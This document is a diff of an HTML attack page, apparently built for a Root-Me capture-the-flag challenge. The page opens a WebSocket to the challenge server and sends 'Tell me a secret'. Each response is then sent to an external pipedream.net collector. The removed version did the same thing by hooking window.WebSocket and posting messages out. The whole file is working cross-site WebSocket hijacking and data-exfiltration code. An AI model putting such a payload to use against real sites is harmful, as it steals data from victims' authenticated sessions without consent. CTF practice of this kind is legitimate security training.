@@ -1,31 +1,16 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <iframe  src="/room" style="width:0;height:0;border:0;"></iframe>
     <script>
-      fetch('https://eo4mg2uuwtytyew.m.pipedream.net/script-start');
-      const oldWS = window.WebSocket;
-      window.WebSocket = function(url, protocols) {
-        const ws = new oldWS(url, protocols);
-        fetch('https://eo4mg2uuwtytyew.m.pipedream.net/ws-hooked');
+      const ws = new WebSocket('ws://ctf20.root-me.org/ws');
 
-        ws.addEventListener('open', () => {
-          ws.send("Tell me a secret");
-          fetch('https://eo4mg2uuwtytyew.m.pipedream.net/msg-sent');
-        });
+      ws.addEventListener('open', () => {
+        ws.send("Tell me a secret");
+      });
 
-        ws.addEventListener('message', (event) => {
-          fetch('https://eo4mg2uuwtytyew.m.pipedream.net/WS', {
-            method: 'POST',
-            mode: 'no-cors',
-            body: event.data
-          });
-        });
-
-        fetch('https://eo4mg2uuwtytyew.m.pipedream.net/script-end');
-
-        return ws;
-      };
+      ws.addEventListener('message', (event) => {
+        fetch('https://eo4mg2uuwtytyew.m.pipedream.net/leak?' + encodeURIComponent(event.data));
+      });
     </script>
   </body>
 </html>
